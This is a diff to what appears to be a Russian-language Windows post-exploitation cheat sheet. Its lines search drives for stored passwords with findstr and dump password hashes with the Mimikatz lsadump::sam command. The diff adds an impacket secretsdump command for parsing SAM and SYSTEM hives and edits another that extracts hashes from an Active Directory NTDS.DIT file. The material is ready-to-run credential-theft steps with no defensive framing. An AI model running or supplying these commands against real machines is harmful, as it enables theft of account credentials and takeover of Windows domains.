@@ -24,9 +24,14 @@ cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config
 
 kiwi_cmd lsadump::sam
 
+
+-----Распарсить SAM
+
+python secretsdump.py -sam sam -system system LOCAL 
+
 -----Распарсить NTDS.DIT
 
-impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL >> text распарсить 
+impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL >> text  
 
 ----- Получить 10 последних пользователей
 
